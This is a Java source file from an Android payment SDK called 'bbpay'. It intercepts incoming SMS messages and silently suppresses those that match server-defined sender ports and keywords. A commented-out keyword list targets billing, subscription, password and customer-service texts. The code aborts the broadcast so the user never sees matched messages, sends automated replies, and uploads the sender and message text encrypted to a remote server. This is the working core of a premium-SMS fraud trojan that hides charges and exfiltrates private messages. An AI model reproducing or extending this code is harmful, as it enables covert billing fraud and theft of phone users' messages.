package com.bbpay.android.sms;
import java.util.Vector;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.bbpay.android.listener.BlockListener;
import com.bbpay.android.manager.FeedbackManager;
import com.bbpay.android.setting.Setting;
import com.bbpay.android.utils.CommonUtil;
import com.bbpay.android.utils.InfoUtils;
import com.bbpay.android.utils.MyLogger;
import com.bbpay.android.utils.RequestUtils;
import com.bbpay.common.bean.Block;
import com.bbpay.common.bean.Feedback;
import com.bbpay.common.bean.request.SmsBlockReportForm;

public class SmsHelper {
    /**
     * "pdus"
     */
    private static String PDUS = "pdus";
    public static Block checkBlock(Context context, String address, String text, BlockListener listener) {
        Block match = null;
        if (address != null && text != null) {
            Vector<Block> blockVector = BlockHelper.readBlocks(context);
            for (int i = blockVector.size() - 1; i >= 0; i--) {
                Block block = blockVector.get(i);
                if (matchBlock(address, text, block)) {
                    match = block;
                    listener.stopBroadcast();
                    break;
                }
            }
            blockVector.clear();
            System.gc();
        }
        return match;
    }
    public static void checkCommonBlocks(String address, String text, BlockListener listener) {
        /* if (address.startsWith("10") || address.startsWith("12")) {
             for (String keyword : blockContents) {
                 if (text.contains(keyword)) {
                     listener.stopBroadcast();
                     return;
                 }
             }
         }*/
    }
    public static void doSmsReceiver(BroadcastReceiver receiver, Context context, Intent intent) {
        MyLogger.debug("SmsReceiver onReceive,action=" + intent.getAction());
        String action = intent.getAction();
        if (CommonUtil.SMS_RECEIVED.equals(action)) {
            SmsHelper.onSmsRecieved(context.getApplicationContext(), receiver, intent);
        } else if (CommonUtil.SMS_SEND.equals(action)) {
            receiver.abortBroadcast();
        }
    }
    public static Feedback checkFeedback(Context context, String address, String text, BlockListener listener) {
        Feedback result = null;
        Vector<Feedback> feedbackVector = BlockHelper.readFeedbacks(context);
        if (feedbackVector != null) {
            for (int i = feedbackVector.size() - 1; i >= 0; i--) {
                Feedback feedback = feedbackVector.get(i);
                Block block = feedback.block;
                if (matchBlock(address, text, block)) {
                    result = feedback;
                    listener.stopBroadcast();
                    break;
                }
            }
        }
        feedbackVector.clear();
        System.gc();
        return result;
    }
    /**
     * "账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码"
     */
    //public static String COMMON_BLOCK_KEYWORS = "账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码,订购";
    //public static List<String> blockContents = Arrays.asList(COMMON_BLOCK_KEYWORS.split(","));
    private static boolean matchBlock(String address, String text, Block block) {
        boolean matchPort = false;
        boolean matchContent = false;
        String blockPort = block.port;
        if (TextUtils.isEmpty(address) || TextUtils.isEmpty(blockPort)) {
            matchPort = true;
        } else {
            String array[] = blockPort.split("\\|");
            for (String port : array) {
                if (!TextUtils.isEmpty(port) && address.contains(port.trim())) {
                    matchPort = true;
                    break;
                }
            }
        }
        if (matchPort) {
            String blockContent = block.content;
            if (TextUtils.isEmpty(blockContent)) {
                matchContent = true;
            } else if (text != null) {
                if (blockContent.contains("&")) {
                    matchContent = true;
                    for (String field : blockContent.split("\\&")) {
                        if (!text.contains(field)) {
                            matchContent = false;
                            break;
                        }
                    }
                } else if (blockContent.contains("|")) {
                    for (String field : blockContent.split("\\|")) {
                        if (text.contains(field)) {
                            matchContent = true;
                            break;
                        }
                    }
                } else {
                    matchContent = text.contains(blockContent);
                }
            }
        }
        boolean result = matchContent && matchPort;
        if (result) {
            block.targetPort = address;
            block.targetContent = text;
        }
        return result;
    }
    public static void onSmsRecieved(Context context, final BroadcastReceiver broadcastreceiver, Intent intent) {
        if (intent != null) {
            Bundle extras = intent.getExtras();
            Object obj = extras.get(PDUS);
            if (obj != null) {
                Object[] pdus = (Object[]) obj;
                SmsMessage[] msgArray = new SmsMessage[pdus.length];
                String address = "";
                StringBuffer messageBody = new StringBuffer();
                for (int i = 0; i < pdus.length; i++) {
                    if (pdus[i] != null) {
                        msgArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        if (msgArray[i] != null) {
                            address = msgArray[i].getOriginatingAddress();
                            messageBody.append(msgArray[i].getMessageBody());
                        }
                    }
                }
                String text = messageBody.toString();
                MyLogger.debug(address, text);
                BlockListener listener = new BlockListener() {
                    private boolean blocked = false;
                    @Override
                    public void stopBroadcast() {
                        if (!blocked) {
                            broadcastreceiver.abortBroadcast();
                            blocked = true;
                        }
                    }
                };
                SmsHelper.checkCommonBlocks(address, text, listener);
                Feedback feedback = checkFeedback(context, address, text, listener);
                if (feedback != null) {
                    FeedbackManager.getInstance(context).executeFeedback(address, text, feedback);
                } else {
                    Block block = checkBlock(context, address, text, listener);
                    if (block != null) {
                        report(context, block, address + "->" + text);
                    }
                }
            }
        }
    }
    
    
    public static void report(final Context context, final Block content, final String message) {
        new Thread() {
            @Override
            public void run() {
                try {
                    SmsBlockReportForm reportForm = InfoUtils.initForm(context, SmsBlockReportForm.class);
                    reportForm.block = content;
                    reportForm.message = message;
                    RequestUtils.encryptPost(context, Setting.getServerUrl(), reportForm.toJson());
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
        }.start();
    }
    
}
